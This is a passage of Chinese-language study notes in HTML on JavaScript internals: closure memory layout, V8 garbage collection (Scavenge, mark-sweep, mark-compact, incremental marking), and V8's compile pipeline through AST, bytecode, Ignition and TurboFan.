title="再谈闭包"></a>再谈闭包</h3><p>现在你知道了作用域内的原始类型数据会被存储到栈空间，引用类型会被存储到堆空间，基于这两点的认知，我们再深入一步，探讨下闭包的内存模型。</p><p>这里以《作用域链和闭包 ：代码中出现相同的变量，JavaScript 引擎是如何选择的？》中关于闭包的一段代码为例：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function foo() &#123;</span><br><span class="line">    var myName = &quot; 极客时间 &quot;</span><br><span class="line">    let test1 = 1</span><br><span class="line">    const test2 = 2</span><br><span class="line">    var innerBar = &#123;</span><br><span class="line">        setName:function(newName)&#123;</span><br><span class="line">            myName = newName</span><br><span class="line">        &#125;,</span><br><span class="line">        getName:function()&#123;</span><br><span class="line">            console.log(test1)</span><br><span class="line">            return myName</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return innerBar</span><br><span class="line">&#125;</span><br><span class="line">var bar = foo()</span><br><span class="line">bar.setName(&quot; 极客邦 &quot;)</span><br><span class="line">bar.getName()</span><br><span class="line">console.log(bar.getName())</span><br></pre></td></tr></table></figure><p>当执行这段代码的时候，你应该有过这样的分析：由于变量 myName、test1、test2 都是原始类型数据，所以在执行 foo 函数的时候，它们会被压入到调用栈中；当 foo 函数执行结束之后，调用栈中 foo 函数的执行上下文会被销毁，其内部变量 myName、test1、test2 也应该一同被销毁。</p><p>但是在<a href="https://time.geekbang.org/column/article/127495">那篇文章</a>中，我们介绍了当 foo 函数的执行上下文销毁时，由于 foo 函数产生了闭包，所以变量 myName 和 test1 并没有被销毁，而是保存在内存中，那么应该如何解释这个现象呢？</p><p>要解释这个现象，我们就得站在内存模型的角度来分析这段代码的执行流程。</p><ol><li>当 JavaScript 引擎执行到 foo 函数时，首先会编译，并创建一个空执行上下文。</li><li>在编译过程中，遇到内部函数 setName，JavaScript 引擎还要对内部函数做一次快速的词法扫描，发现该内部函数引用了 foo 函数中的 myName 变量，由于是内部函数引用了外部函数的变量，所以 JavaScript 引擎判断这是一个闭包，于是在堆空间创建换一个“closure(foo)”的对象（这是一个内部对象，JavaScript 是无法访问的），用来保存 myName 变量。</li><li>接着继续扫描到 getName 方法时，发现该函数内部还引用变量 test1，于是 JavaScript 引擎又将 test1 添加到“closure(foo)”对象中。这时候堆中的“closure(foo)”对象中就包含了 myName 和 test1 两个变量了。</li><li>由于 test2 并没有被内部函数引用，所以 test2 依然保存在调用栈中。</li></ol><p>通过上面的分析，我们可以画出执行到 foo 函数中“return innerBar”语句时的调用栈状态，如下图所示：<img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014182242392.png" alt="image-20221014182242392"></p><p>从上图你可以清晰地看出，当执行到 foo 函数时，闭包就产生了；当 foo 函数执行结束之后，返回的 getName 和 setName 方法都引用“clourse(foo)”对象，所以即使 foo 函数退出了，“clourse(foo)”依然被其内部的 getName 和 setName 方法引用。所以在下次调用<code>bar.setName</code>或者<code>bar.getName</code>时，创建的执行上下文中就包含了“clourse(foo)”。</p><p>总的来说，产生闭包的核心有两步：第一步是需要预扫描内部函数；第二步是把内部函数引用的外部变量保存到堆中。</p><h3 id="总结-11"><a href="#总结-11" class="headerlink" title="总结"></a>总结</h3><p>好了，今天就讲到这里，下面我来简单总结下今天的要点。</p><p>我们介绍了 JavaScript 中的 8 种数据类型，它们可以分为两大类——<strong>原始类型和引用类型</strong>。</p><p>其中，原始类型的数据是存放在<strong>栈</strong>中，引用类型的数据是存放在<strong>堆</strong>中的。堆中的数据是通过引用和变量关联起来的。也就是说，JavaScript 的变量是没有数据类型的，值才有数据类型，变量可以随时持有任何类型的数据。</p><p>然后我们分析了，在 JavaScript 中将一个原始类型的变量 a 赋值给 b，那么 a 和 b 会相互独立、互不影响；但是将引用类型的变量 a 赋值给变量 b，那会导致 a、b 两个变量都同时指向了堆中的同一块数据。</p><p>最后，我们还站在内存模型的视角分析了闭包的产生过程。</p><h2 id="2-垃圾回收：垃圾数据是如何自动回收的？"><a href="#2-垃圾回收：垃圾数据是如何自动回收的？" class="headerlink" title="2. 垃圾回收：垃圾数据是如何自动回收的？"></a>2. 垃圾回收：垃圾数据是如何自动回收的？</h2><p>在上一篇文章中，我们提到了 JavaScript 中的数据是如何存储的，并通过例子分析了<strong>原始数据类型是存储在栈空间中的，引用类型的数据是存储在堆空间中的</strong>。通过这种分配方式，我们解决了数据的内存分配的问题。</p><p>不过有些数据被使用之后，可能就不再需要了，我们把这种数据称为<strong>垃圾数据</strong>。如果这些垃圾数据一直保存在内存中，那么内存会越用越多，所以我们需要<strong>对这些垃圾数据进行回收，以释放有限的内存空间</strong>。</p><h3 id="不同语言的垃圾回收策略"><a href="#不同语言的垃圾回收策略" class="headerlink" title="不同语言的垃圾回收策略"></a>不同语言的垃圾回收策略</h3><p>通常情况下，垃圾数据回收分为<strong>手动回收</strong>和<strong>自动回收</strong>两种策略。</p><p>如 C&#x2F;C++ 就是使用手动回收策略，<strong>何时分配内存、何时销毁内存都是由代码控制的</strong>，你可以参考下面这段 C 代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 在堆中分配内存</span><br><span class="line">char* p =  (char*)malloc(2048);  // 在堆空间中分配 2048 字节的空间，并将分配后的引用地址保存到 p 中</span><br><span class="line"></span><br><span class="line"> // 使用 p 指向的内存</span><br><span class="line"> &#123;</span><br><span class="line">   //....</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">// 使用结束后，销毁这段内存</span><br><span class="line">free(p)；</span><br><span class="line">p = NULL；</span><br></pre></td></tr></table></figure><p>从上面这段 C 代码可以看出来，要使用堆中的一块空间，我们需要先调用 mallco 函数分配内存，然后再使用；当不再需要这块数据的时候，就要手动调用 free 函数来释放内存。如果这段数据已经不再需要了，但是又没有主动调用 free 函数来销毁，那么这种情况就被称为<strong>内存泄漏</strong>。</p><p>另外一种使用的是自动垃圾回收的策略，如 JavaScript、Java、Python 等语言，<strong>产生的垃圾数据是由垃圾回收器来释放的</strong>，并不需要手动通过代码来释放。</p><p>对于 JavaScript 而言，也正是这个“自动”释放资源的特性带来了很多困惑，也让一些 JavaScript 开发者误以为可以不关心内存管理，这是一个很大的误解。</p><p>那么在本文，我们将围绕“JavaScript 的数据是如何回收的”这个话题来展开探讨。因为数据是存储在栈和堆两种内存空间中的，所以接下来我们就来分别介绍“栈中的垃圾数据”和“堆中的垃圾数据”是如何回收的。</p><h3 id="调用栈中的数据是如何回收的"><a href="#调用栈中的数据是如何回收的" class="headerlink" title="调用栈中的数据是如何回收的"></a>调用栈中的数据是如何回收的</h3><p>首先是调用栈中的数据，我们还是通过一段示例代码的执行流程来分析其回收机制，具体如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function foo()&#123;</span><br><span class="line">    var a = 1</span><br><span class="line">    var b = &#123;name:&quot; 极客邦 &quot;&#125;</span><br><span class="line">    function showName()&#123;</span><br><span class="line">      var c = &quot; 极客时间 &quot;</span><br><span class="line">      var d = &#123;name:&quot; 极客时间 &quot;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    showName()</span><br><span class="line">&#125;</span><br><span class="line">foo()</span><br></pre></td></tr></table></figure><p>当执行到第 6 行代码时，其调用栈和堆空间状态图如下所示：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014183507030.png" alt="image-20221014183507030"></p><p>从图中可以看出，原始类型的数据被分配到栈中，引用类型的数据会被分配到堆中。当 foo 函数执行结束之后，foo 函数的执行上下文会从堆中被销毁掉，那么它是怎么被销毁的呢？下面我们就来分析一下。</p><p>在上篇文章中，我们简单介绍过了，如果执行到 showName 函数时，那么 JavaScript 引擎会创建 showName 函数的执行上下文，并将 showName 函数的执行上下文压入到调用栈中，最终执行到 showName 函数时，其调用栈就如上图所示。与此同时，还有一个<strong>记录当前执行状态的指针（称为 ESP）</strong>，指向调用栈中 showName 函数的执行上下文，表示当前正在执行 showName 函数。</p><p>接着，当 showName 函数执行完成之后，函数执行流程就进入了 foo 函数，那这时就需要销毁 showName 函数的执行上下文了。ESP 这时候就帮上忙了，JavaScript 会将 ESP 下移到 foo 函数的执行上下文，<strong>这个下移操作就是销毁 showName 函数执行上下文的过程</strong>。</p><p>你可能会有点懵，ESP 指针向下移动怎么就能把 showName 的执行上下文销毁了呢？具体你可以看下面这张移动 ESP 前后的对比图：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014183527687.png" alt="image-20221014183527687"></p><p>从图中可以看出，当 showName 函数执行结束之后，ESP 向下移动到 foo 函数的执行上下文中，上面 showName 的执行上下文虽然保存在栈内存中，但是已经是无效内存了。比如当 foo 函数再次调用另外一个函数时，这块内容会被直接覆盖掉，用来存放另外一个函数的执行上下文。</p><p>所以说，当一个函数执行结束之后，<strong>JavaScript 引擎会通过向下移动 ESP 来销毁该函数保存在栈中的执行上下文</strong>。</p><h3 id="堆中的数据是如何回收的"><a href="#堆中的数据是如何回收的" class="headerlink" title="堆中的数据是如何回收的"></a>堆中的数据是如何回收的</h3><p>通过上面的讲解，我想现在你应该已经知道，当上面那段代码的 foo 函数执行结束之后，ESP 应该是指向全局执行上下文的，那这样的话，showName 函数和 foo 函数的执行上下文就处于无效状态了，不过保存在堆中的两个对象依然占用着空间，如下图所示：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014183956928.png" alt="image-20221014183956928"></p><p>从图中可以看出，1003 和 1050 这两块内存依然被占用。<strong>要回收堆中的垃圾数据，就需要用到 JavaScript 中的垃圾回收器了</strong>。</p><p>所以，接下来我们就来通过 Chrome 的 JavaScript 引擎 V8 来分析下堆中的垃圾数据是如何回收的。</p><h3 id="代际假说和分代收集"><a href="#代际假说和分代收集" class="headerlink" title="代际假说和分代收集"></a>代际假说和分代收集</h3><p>不过在正式介绍 V8 是如何实现回收之前，你需要先学习下<strong>代际假说（The Generational Hypothesis）</strong>的内容，这是垃圾回收领域中一个重要的术语，后续垃圾回收的策略都是建立在该假说的基础之上的，所以很是重要。</p><p><strong>代际假说</strong>有以下两个特点：</p><ul><li>第一个是大部分对象在内存中存在的时间很短，简单来说，就是很多对象一经分配内存，很快就变得不可访问；</li><li>第二个是不死的对象，会活得更久。</li></ul><p>其实这两个特点不仅仅适用于 JavaScript，同样适用于大多数的动态语言，如 Java、Python 等。</p><p>有了代际假说的基础，我们就可以来探讨 V8 是如何实现垃圾回收的了。</p><p>通常，垃圾回收算法有很多种，但是并没有哪一种能胜任所有的场景，你需要权衡各种场景，根据对象的生存周期的不同而使用不同的算法，以便达到最好的效果。</p><p>所以，在 V8 中会把堆分为<strong>新生代</strong>和<strong>老生代</strong>两个区域，<strong>新生代中存放的是生存时间短的对象，老生代中存放的生存时间久的对象</strong>。</p><p>新生区通常只支持 1 ～ 8M 的容量，而老生区支持的容量就大很多了。对于这两块区域，V8 分别使用两个不同的垃圾回收器，以便更高效地实施垃圾回收。</p><ul><li><strong>副垃圾回收器，主要负责新生代的垃圾回收。</strong></li><li><strong>主垃圾回收器，主要负责老生代的垃圾回收。</strong></li></ul><h3 id="垃圾回收器的工作流程"><a href="#垃圾回收器的工作流程" class="headerlink" title="垃圾回收器的工作流程"></a>垃圾回收器的工作流程</h3><p>现在你知道了 V8 把堆分成两个区域——新生代和老生代，并分别使用两个不同的垃圾回收器。其实<strong>不论什么类型的垃圾回收器，它们都有一套共同的执行流程</strong>。</p><p>第一步是标记空间中活动对象和非活动对象。所谓活动对象就是还在使用的对象，非活动对象就是可以进行垃圾回收的对象。</p><p>第二步是回收非活动对象所占据的内存。其实就是在所有的标记完成之后，统一清理内存中所有被标记为可回收的对象。</p><p>第三步是做内存整理。一般来说，频繁回收对象后，内存中就会存在大量不连续空间，我们把这些不连续的内存空间称为<strong>内存碎片</strong>。当内存中出现了大量的内存碎片之后，如果需要分配较大连续内存的时候，就有可能出现内存不足的情况。所以最后一步需要整理这些内存碎片，但这步其实是可选的，因为有的垃圾回收器不会产生内存碎片，比如接下来我们要介绍的副垃圾回收器。</p><p>那么接下来，我们就按照这个流程来分析新生代垃圾回收器（副垃圾回收器）和老生代垃圾回收器（主垃圾回收器）是如何处理垃圾回收的。</p><h3 id="副垃圾回收器"><a href="#副垃圾回收器" class="headerlink" title="副垃圾回收器"></a>副垃圾回收器</h3><p>副垃圾回收器主要负责新生区的垃圾回收。而通常情况下，大多数小的对象都会被分配到新生区，所以说这个区域虽然不大，但是垃圾回收还是比较频繁的。</p><p>新生代中用<strong>Scavenge 算法</strong>来处理。所谓 Scavenge 算法，是把新生代空间对半划分为两个区域，一半是对象区域，一半是空闲区域，如下图所示：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014184357845.png" alt="image-20221014184357845"></p><p>新加入的对象都会存放到对象区域，当对象区域快被写满时，就需要执行一次垃圾清理操作。</p><p>在垃圾回收过程中，首先要对对象区域中的垃圾做标记；标记完成之后，就进入垃圾清理阶段，副垃圾回收器会把这些存活的对象复制到空闲区域中，同时它还会把这些对象有序地排列起来，所以这个复制过程，也就相当于完成了内存整理操作，复制后空闲区域就没有内存碎片了。</p><p>完成复制后，对象区域与空闲区域进行角色翻转，也就是原来的对象区域变成空闲区域，原来的空闲区域变成了对象区域。这样就完成了垃圾对象的回收操作，同时这种<strong>角色翻转的操作还能让新生代中的这两块区域无限重复使用下去</strong>。</p><p>由于新生代中采用的 Scavenge 算法，所以每次执行清理操作时，都需要将存活的对象从对象区域复制到空闲区域。但复制操作需要时间成本，如果新生区空间设置得太大了，那么每次清理的时间就会过久，所以<strong>为了执行效率，一般新生区的空间会被设置得比较小</strong>。</p><p>也正是因为新生区的空间不大，所以很容易被存活的对象装满整个区域。为了解决这个问题，JavaScript 引擎采用了<strong>对象晋升策略</strong>，也就是经过两次垃圾回收依然还存活的对象，会被移动到老生区中。</p><h3 id="主垃圾回收器"><a href="#主垃圾回收器" class="headerlink" title="主垃圾回收器"></a>主垃圾回收器</h3><p>主垃圾回收器主要负责老生区中的垃圾回收。除了新生区中晋升的对象，一些大的对象会直接被分配到老生区。因此老生区中的对象有两个特点，一个是对象占用空间大，另一个是对象存活时间长。</p><p>由于老生区的对象比较大，若要在老生区中使用 Scavenge 算法进行垃圾回收，复制这些大的对象将会花费比较多的时间，从而导致回收执行效率不高，同时还会浪费一半的空间。因而，主垃圾回收器是采用<strong>标记 - 清除（Mark-Sweep）</strong>的算法进行垃圾回收的。下面我们来看看该算法是如何工作的。</p><p>首先是标记过程阶段。标记阶段就是从一组根元素开始，递归遍历这组根元素，在这个遍历过程中，能到达的元素称为<strong>活动对象</strong>，没有到达的元素就可以判断为<strong>垃圾数据</strong>。</p><p>比如最开始的那段代码，当 showName 函数执行退出之后，这段代码的调用栈和堆空间如下图所示：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014202502037.png" alt="image-20221014202502037"></p><p>从上图你可以大致看到垃圾数据的标记过程，当 showName 函数执行结束之后，ESP 向下移动，指向了 foo 函数的执行上下文，这时候如果遍历调用栈，是不会找到引用 1003 地址的变量，也就意味着 1003 这块数据为垃圾数据，被标记为红色。由于 1050 这块数据被变量 b 引用了，所以这块数据会被标记为活动对象。这就是大致的标记过程。</p><p>接下来就是垃圾的清除过程。它和副垃圾回收器的垃圾清除过程完全不同，你可以理解这个过程是清除掉红色标记数据的过程，可参考下图大致理解下其清除过程：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014202606322.png" alt="image-20221014202606322"></p><p>上面的标记过程和清除过程就是标记 - 清除算法，不过对一块内存多次执行标记 - 清除算法后，会产生大量不连续的内存碎片。而碎片过多会导致大对象无法分配到足够的连续内存，于是又产生了另外一种算法——<strong>标记 - 整理（Mark-Compact）</strong>，这个标记过程仍然与标记 - 清除算法里的是一样的，但后续步骤不是直接对可回收对象进行清理，而是让所有存活的对象都向一端移动，然后直接清理掉端边界以外的内存。你可以参考下图：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014202642256.png" alt="image-20221014202642256"></p><h3 id="全停顿"><a href="#全停顿" class="headerlink" title="全停顿"></a>全停顿</h3><p>现在你知道了 V8 是使用副垃圾回收器和主垃圾回收器处理垃圾回收的，不过由于 JavaScript 是运行在主线程之上的，一旦执行垃圾回收算法，都需要将正在执行的 JavaScript 脚本暂停下来，待垃圾回收完毕后再恢复脚本执行。我们把这种行为叫做<strong>全停顿（Stop-The-World）</strong>。</p><p>比如堆中的数据有 1.5GB，V8 实现一次完整的垃圾回收需要 1 秒以上的时间，这也是由于垃圾回收而引起 JavaScript 线程暂停执行的时间，若是这样的时间花销，那么应用的性能和响应能力都会直线下降。主垃圾回收器执行一次完整的垃圾回收流程如下图所示：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014202735200.png" alt="image-20221014202735200"></p><p>在 V8 新生代的垃圾回收中，因其空间较小，且存活对象较少，所以全停顿的影响不大，但老生代就不一样了。如果在执行垃圾回收的过程中，占用主线程时间过久，就像上面图片展示的那样，花费了 200 毫秒，在这 200 毫秒内，主线程是不能做其他事情的。比如页面正在执行一个 JavaScript 动画，因为垃圾回收器在工作，就会导致这个动画在这 200 毫秒内无法执行的，这将会造成页面的卡顿现象。</p><p>为了降低老生代的垃圾回收而造成的卡顿，V8 将标记过程分为一个个的子标记过程，同时让垃圾回收标记和 JavaScript 应用逻辑交替进行，直到标记阶段完成，我们把这个算法称为<strong>增量标记（Incremental Marking）算法</strong>。如下图所示：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014202823131.png" alt="image-20221014202823131"></p><p>使用增量标记算法，可以把一个完整的垃圾回收任务拆分为很多小的任务，这些小的任务执行时间比较短，可以穿插在其他的 JavaScript 任务中间执行，这样当执行上述动画效果时，就不会让用户因为垃圾回收任务而感受到页面的卡顿了。</p><h3 id="总结-12"><a href="#总结-12" class="headerlink" title="总结"></a>总结</h3><p>好了，今天就讲到这里，下面我们就来总结下今天的主要内容。</p><p>首先我们介绍了不同语言的垃圾回收策略，然后又说明了栈中的数据是如何回收的，最后重点讲解了 JavaScript 中的垃圾回收器是如何工作的。</p><p>从上面的分析你也能看出来，无论是垃圾回收的策略，还是处理全停顿的策略，往往都没有一个完美的解决方案，你需要花一些时间来做权衡，而这需要牺牲当前某几方面的指标来换取其他几个指标的提升。</p><p>其实站在工程师的视角，我们经常需要在满足需求的前提下，权衡各个指标的得失，把系统设计得尽可能适应最核心的需求。</p><p>生活中处理事情的原则也与之类似，古人很早就说过“两害相权取其轻，两利相权取其重”，所以与其患得患失，不如冷静地分析哪些才是核心诉求，然后果断决策牺牲哪些以使得利益最大化。</p><h2 id="3-编译器和解释器：V8-是如何执行一段-JavaScript-代码的？"><a href="#3-编译器和解释器：V8-是如何执行一段-JavaScript-代码的？" class="headerlink" title="3. 编译器和解释器：V8 是如何执行一段 JavaScript 代码的？"></a>3. 编译器和解释器：V8 是如何执行一段 JavaScript 代码的？</h2><p>前面我们已经花了很多篇幅来介绍 JavaScript 是如何工作的，了解这些内容能帮助你从底层理解 JavaScript 的工作机制，从而能帮助你更好地理解和应用 JavaScript。</p><p>今天这篇文章我们就继续“向下”分析，站在 JavaScript 引擎 V8 的视角，来分析 JavaScript 代码是如何被执行的。</p><p>前端工具和框架的自身更新速度非常块，而且还不断有新的出现。要想追赶上前端工具和框架的更新速度，你就需要抓住那些本质的知识，然后才能更加轻松地理解这些上层应用。比如我们接下来要介绍的 V8 执行机制，能帮助你从底层了解 JavaScript，也能帮助你深入理解语言转换器 Babel、语法检查工具 ESLint、前端框架 Vue 和 React 的一些底层实现机制。因此，了解 V8 的编译流程能让你对语言以及相关工具有更加充分的认识。</p><p>要深入理解 V8 的工作原理，你需要搞清楚一些概念和原理，比如接下来我们要详细讲解的<strong>编译器（Compiler）、解释器（Interpreter）、抽象语法树（AST）、字节码（Bytecode）、即时编译器（JIT）</strong>等概念，都是你需要重点关注的。</p><h3 id="编译器和解释器"><a href="#编译器和解释器" class="headerlink" title="编译器和解释器"></a>编译器和解释器</h3><p>之所以存在编译器和解释器，是因为机器不能直接理解我们所写的代码，所以在执行程序之前，需要将我们所写的代码“翻译”成机器能读懂的机器语言。按语言的执行流程，可以把语言划分为编译型语言和解释型语言。</p><p><strong>编译型语言在程序执行之前，需要经过编译器的编译过程，并且编译之后会直接保留机器能读懂的二进制文件，这样每次运行程序时，都可以直接运行该二进制文件，而不需要再次重新编译了</strong>。比如 C&#x2F;C++、GO 等都是编译型语言。</p><p><strong>而由解释型语言编写的程序，在每次运行时都需要通过解释器对程序进行动态解释和执行</strong>。比如 Python、JavaScript 等都属于解释型语言。</p><p>那编译器和解释器是如何“翻译”代码的呢？具体流程你可以参考下图：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014203026059.png" alt="image-20221014203026059"></p><p>从图中你可以看出这二者的执行流程，大致可阐述为如下：</p><ol><li>在编译型语言的编译过程中，编译器首先会依次对源代码进行词法分析、语法分析，生成抽象语法树（AST），然后是优化代码，最后再生成处理器能够理解的机器码。如果编译成功，将会生成一个可执行的文件。但如果编译过程发生了语法或者其他的错误，那么编译器就会抛出异常，最后的二进制文件也不会生成成功。</li><li>在解释型语言的解释过程中，同样解释器也会对源代码进行词法分析、语法分析，并生成抽象语法树（AST），不过它会再基于抽象语法树生成字节码，最后再根据字节码来执行程序、输出结果。</li></ol><h3 id="V8-是如何执行一段-JavaScript-代码的"><a href="#V8-是如何执行一段-JavaScript-代码的" class="headerlink" title="V8 是如何执行一段 JavaScript 代码的"></a>V8 是如何执行一段 JavaScript 代码的</h3><p>通过上面的介绍，相信你已经了解编译器和解释器了。那接下来，我们就重点分析下 V8 是如何执行一段 JavaScript 代码的。你可以先来“一览全局”，参考下图：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014203035878.png" alt="image-20221014203035878"></p><p>从图中可以清楚地看到，V8 在执行过程中既有<strong>解释器 Ignition</strong>，又有<strong>编译器 TurboFan</strong>，那么它们是如何配合去执行一段 JavaScript 代码的呢? 下面我们就按照上图来一一分解其执行流程。</p><h4 id="1-生成抽象语法树（AST）和执行上下文"><a href="#1-生成抽象语法树（AST）和执行上下文" class="headerlink" title="1. 生成抽象语法树（AST）和执行上下文"></a>1. 生成抽象语法树（AST）和执行上下文</h4><p>将源代码转换为<strong>抽象语法树</strong>，并生成<strong>执行上下文</strong>，而执行上下文我们在前面的文章中已经介绍过很多了，主要是代码在执行过程中的环境信息。</p><p>那么下面我们就得重点讲解下抽象语法树（下面表述中就直接用它的简称 AST 了），看看什么是 AST 以及 AST 的生成过程是怎样的。</p><p>高级语言是开发者可以理解的语言，但是让编译器或者解释器来理解就非常困难了。对于编译器或者解释器来说，它们可以理解的就是 AST 了。所以无论你使用的是解释型语言还是编译型语言，在编译过程中，它们都会生成一个 AST。这和渲染引擎将 HTML 格式文件转换为计算机可以理解的 DOM 树的情况类似。</p><p>你可以结合下面这段代码来直观地感受下什么是 AST：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var myName = &quot; 极客时间 &quot;</span><br><span class="line">function foo()&#123;</span><br><span class="line">  return 23;</span><br><span class="line">&#125;</span><br><span class="line">myName = &quot;geektime&quot;</span><br><span class="line">foo()</span><br></pre></td></tr></table></figure><p>这段代码经过<a href="http://resources.jointjs.com/demos/javascript-ast">javascript-ast</a>站点处理后，生成的 AST 结构如下：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014203100507.png" alt="image-20221014203100507"></p><p>从图中可以看出，AST 的结构和代码的结构非常相似，其实你也可以把 AST 看成代码的结构化的表示，编译器或者解释器后续的工作都需要依赖于 AST，而不是源代码。</p><p>AST 是非常重要的一种数据结构，在很多项目中有着广泛的应用。其中最著名的一个项目是 Babel。Babel 是一个被广泛使用的代码转码器，可以将 ES6 代码转为 ES5 代码，这意味着你可以现在就用 ES6 编写程序，而不用担心现有环境是否支持 ES6。Babel 的工作原理就是先将 ES6 源码转换为 AST，然后再将 ES6 语法的 AST 转换为 ES5 语法的 AST，最后利用 ES5 的 AST 生成 JavaScript 源代码。</p><p>除了 Babel 外，还有 ESLint 也使用 AST。ESLint 是一个用来检查 JavaScript 编写规范的插件，其检测流程也是需要将源码转换为 AST，然后再利用 AST 来检查代码规范化的问题。</p><p>现在你知道了什么是 AST 以及它的一些应用，那接下来我们再来看下 AST 是如何生成的。通常，生成 AST 需要经过两个阶段。</p><p><strong>第一阶段是分词（tokenize），又称为词法分析</strong>，其作用是将一行行的源码拆解成一个个 token。所谓<strong>token</strong>，指的是语法上不可能再分的、最小的单个字符或字符串。你可以参考下图来更好地理解什么 token。</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014203110951.png" alt="image-20221014203110951"></p><p>从图中可以看出，通过<code>var myName = “极客时间”</code>简单地定义了一个变量，其中关键字“var”、标识符“myName” 、赋值运算符“&#x3D;”、字符串“极客时间”四个都是 token，而且它们代表的属性还不一样。</p><p><strong>第二阶段是解析（parse），又称为语法分析</strong>，其作用是将上一步生成的 token 数据，根据语法规则转为 AST。如果源码符合语法规则，这一步就会顺利完成。但如果源码存在语法错误，这一步就会终止，并抛出一个“语法错误”。</p><p>这就是 AST 的生成过程，先分词，再解析。</p><p>有了 AST 后，那接下来 V8 就会生成该段代码的执行上下文。至于执行上下文的具体内容，你可以参考前面几篇文章的讲解。</p><h4 id="2-生成字节码"><a href="#2-生成字节码" class="headerlink" title="2. 生成字节码"></a>2. 生成字节码</h4><p>有了 AST 和执行上下文后，那接下来的第二步，解释器 Ignition 就登场了，它会根据 AST 生成字节码，并解释执行字节码。</p><p>其实一开始 V8 并没有字节码，而是直接将 AST 转换为机器码，由于执行机器码的效率是非常高效的，所以这种方式在发布后的一段时间内运行效果是非常好的。但是随着 Chrome 在手机上的广泛普及，特别是运行在 512M 内存的手机上，内存占用问题也暴露出来了，因为 V8 需要消耗大量的内存来存放转换后的机器码。为了解决内存占用问题，V8 团队大幅重构了引擎架构，引入字节码，并且抛弃了之前的编译器，最终花了将进四年的时间，实现了现在的这套架构。</p><p>那什么是字节码呢？为什么引入字节码就能解决内存占用问题呢？</p><p><strong>字节码就是介于 AST 和机器码之间的一种代码。但是与特定类型的机器码无关，字节码需要通过解释器将其转换为机器码后才能执行。</strong></p><p>理解了什么是字节码，我们再来对比下高级代码、字节码和机器码，你可以参考下图：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014203122625.png" alt="image-20221014203122625"></p><p>从图中可以看出，机器码所占用的空间远远超过了字节码，所以使用字节码可以减少系统的内存使用。</p><h4 id="3-执行代码"><a href="#3-执行代码" class="headerlink" title="3. 执行代码"></a>3. 执行代码</h4><p>生成字节码之后，接下来就要进入执行阶段了。</p><p>通常，如果有一段第一次执行的字节码，解释器 Ignition 会逐条解释执行。在执行字节码的过程中，如果发现有热点代码（HotSpot），比如一段代码被重复执行多次，这种就称为<strong>热点代码</strong>，那么后台的编译器 TurboFan 就会把该段热点的字节码编译为高效的机器码，然后当再次执行这段被优化的代码时，只需要执行编译后的机器码就可以了，这样就大大提升了代码的执行效率。</p><p>V8 的解释器和编译器的取名也很有意思。解释器 Ignition 是点火器的意思，编译器 TurboFan 是涡轮增压的意思，寓意着代码启动时通过点火器慢慢发动，一旦启动，涡轮增压介入，其执行效率随着执行时间越来越高效率，因为热点代码都被编译器 TurboFan 转换了机器码，直接执行机器码就省去了字节码“翻译”为机器码的过程。</p><p>其实字节码配合解释器和编译器是最近一段时间很火的技术，比如 Java 和 Python 的虚拟机也都是基于这种技术实现的，我们把这种技术称为<strong>即时编译（JIT）</strong>。具体到 V8，就是指解释器 Ignition 在解释执行字节码的同时，收集代码信息，当它发现某一部分代码变热了之后，TurboFan 编译器便闪亮登场，把热点的字节码转换为机器码，并把转换后的机器码保存起来，以备下次使用。</p><p>对于 JavaScript 工作引擎，除了 V8 使用了“字节码 +JIT”技术之外，苹果的 SquirrelFish Extreme 和 Mozilla 的 SpiderMonkey 也都使用了该技术。</p><p>这么多语言的工作引擎都使用了“字节码 +JIT”技术，因此理解 JIT 这套工作机制还是很有必要的。你可以结合下图看看 JIT 的工作过程：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014203137912.png" alt="image-20221014203137912"></p><h3 id="JavaScript-的性能优化"><a href="#JavaScript-的性能优化" class="headerlink" title="JavaScript 的性能优化"></a>JavaScript 的性能优化</h3><p>到这里相信你现在已经了解 V8 是如何执行一段 JavaScript 代码的了。在过去几年中，JavaScript 的性能得到了大幅提升，这得益于 V8 团队对解释器和编译器的不断改进和优化。</p><p>虽然在 V8 诞生之初，也出现过一系列针对 V8 而专门优化 JavaScript 性能的方案，比如隐藏类、内联缓存等概念都是那时候提出来的。不过随着 V8 的架构调整，你越来越不需要这些微优化策略了，相反，对于优化 JavaScript 执行效率，你应该将优化的中心聚焦在单次脚本的执行时间和脚本的网络下载上，主要关注以下三点内容：</p><ol><li>提升单次脚本的执行速度，避免 JavaScript 的长任务霸占主线程，这样可以使得页面快速响应交互；</li><li>避免大的内联脚本，因为在解析 HTML 的过程中，解析和编译也会占用主线程；</li><li>减少 JavaScript 文件的容量，因为更小的文件会提升下载速度，并且占用更低的内存。</li></ol><h3 id="总结-13"><a href="#总结-13" class="headerlink" title="总结"></a>总结</h3><p>好了，今天就讲到这里，下面我来总结下今天的内容。</p><ul><li>首先我们介绍了编译器和解释器的区别。</li><li>紧接着又详细分析了 V8 是如何执行一段 JavaScript 代码的：V8 依据 JavaScript 代码生成 AST 和执行上下文，再基于 AST 